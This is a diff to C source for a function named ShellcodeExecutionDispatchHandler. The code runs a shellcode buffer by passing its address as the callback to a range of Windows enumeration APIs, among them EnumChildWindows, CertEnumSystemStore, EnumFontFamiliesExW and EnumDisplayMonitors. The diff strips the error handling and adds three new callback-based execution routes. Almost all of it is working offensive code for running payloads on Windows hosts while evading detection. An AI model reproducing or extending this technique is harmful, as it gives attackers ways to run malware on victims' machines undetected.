@@ -18,64 +18,43 @@ DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
 		case E_CDEFFOLDERMENU_CREATE2:
 		{
 			IContextMenu* ContextMenuRequired = NULL;
-
-			if (!SUCCEEDED(CDefFolderMenu_Create2(NULL, NULL, 0, NULL, NULL, (LPFNDFMCALLBACK)BinAddress, 0, NULL, &ContextMenuRequired)))
-				goto EXIT_ROUTINE;
-
+			CDefFolderMenu_Create2(NULL, NULL, 0, NULL, NULL, (LPFNDFMCALLBACK)BinAddress, 0, NULL, &ContextMenuRequired);
 			break;
 		}
 
 		case E_CERTENUMSYSTEMSTORE:
 		{
-			if (!CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)BinAddress))
-				goto EXIT_ROUTINE;
-
+			CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)BinAddress);
 			break;
 		}
 		
 		case E_CERTENUMSYSTEMSTORELOCATION:
 		{
-
-			if (CertEnumSystemStoreLocation(NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE_LOCATION)BinAddress))
-				goto EXIT_ROUTINE;
-
+			CertEnumSystemStoreLocation(NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE_LOCATION)BinAddress);
 			break;
-		}
-
-		case E_CERTFINDCHAININSTORE:
-		{
-			goto EXIT_ROUTINE;
 		}
 
 		case E_ENUMCHILDWINDOWS:
 		{
-			if (!EnumChildWindows(NULL, (WNDENUMPROC)BinAddress, NULL))
-				goto EXIT_ROUTINE;
-
+			EnumChildWindows(NULL, (WNDENUMPROC)BinAddress, NULL);
 			break;
 		}
 
 		case E_ENUMDATEFORMATSW:
 		{
-			if (!EnumDateFormatsW((DATEFMT_ENUMPROCW)BinAddress, LOCALE_SYSTEM_DEFAULT, 0))
-				goto EXIT_ROUTINE;
-
+			EnumDateFormatsW((DATEFMT_ENUMPROCW)BinAddress, LOCALE_SYSTEM_DEFAULT, 0);
 			break;
 		}
 
 		case E_ENUMDESKTOPWINDOWS:
 		{
-			if (!EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()), (WNDENUMPROC)BinAddress, NULL))
-				goto EXIT_ROUTINE;
-
+			EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()), (WNDENUMPROC)BinAddress, NULL);
 			break;
 		}
 
 		case E_ENUMDESKTOPSW:
 		{
-			if (!EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)BinAddress, NULL))
-				goto EXIT_ROUTINE;
-
+			EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)BinAddress, NULL);
 			break;
 		}
 
@@ -95,9 +74,7 @@ DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
 
 		case E_ENUMDISPLAYMONITORS:
 		{
-			if (!EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)BinAddress, NULL))
-				goto EXIT_ROUTINE;
-
+			EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)BinAddress, NULL);
 			break;
 		}
 
@@ -106,9 +83,7 @@ DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
 			LOGFONTW Font = { 0 };
 			Font.lfCharSet = DEFAULT_CHARSET;
 
-			if (!EnumFontFamiliesExW(GetDC(NULL), &Font, (FONTENUMPROCW)BinAddress, NULL, NULL))
-				goto EXIT_ROUTINE;
-
+			EnumFontFamiliesExW(GetDC(NULL), &Font, (FONTENUMPROCW)BinAddress, NULL, NULL);
 			break;
 		}
 
@@ -116,11 +91,6 @@ DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
 		{
 			EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)BinAddress, NULL);
 			break;
-		}
-
-		case E_ENUMICMPROFILESW:
-		{
-			goto EXIT_ROUTINE;
 		}
 
 		case E_ENUMLANGUAGEGROUPLOCALESW:
@@ -136,11 +106,6 @@ DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
 
 			EnumObjects(GetDC(NULL), OBJ_BRUSH, (GOBJENUMPROC)BinAddress, NULL);
 			break;
-		}
-
-		case E_ENUMPROPSEXW:
-		{
-			goto EXIT_ROUTINE;
 		}
 
 		case E_ENUMRESOURCETYPESEXW:
@@ -203,11 +168,6 @@ DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
 			break;
 		}
 
-		case E_ENUMPROPSW:
-		{
-			goto EXIT_ROUTINE;
-		}
-
 		case E_MESSAGEBOXINDIRECT:
 		{
 			MSGBOXPARAMS MessageBoxParams = { 0 };
@@ -221,10 +181,24 @@ DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
 			break;
 		}
 
-		case E_PERFSTARTPROVIDEREX:
+		case E_ENUMERATELOADEDMODULES:
 		{
-			goto EXIT_ROUTINE;
+			EnumerateLoadedModules64(InlineGetCurrentProcess, (PENUMLOADED_MODULES_CALLBACK)BinAddress, NULL);
+			break;
 		}
+
+		case E_ENUMPAGEFILESW:
+		{
+			K32EnumPageFilesW((PENUM_PAGE_FILE_CALLBACKW)BinAddress, NULL);
+			break;
+		}
+
+		case E_ENUMPWRSCHEMES:
+		{
+			EnumPwrSchemes((PWRSCHEMESENUMPROC)BinAddress, NULL);
+			break;
+		}
+
 		default:
 			goto EXIT_ROUTINE;
 
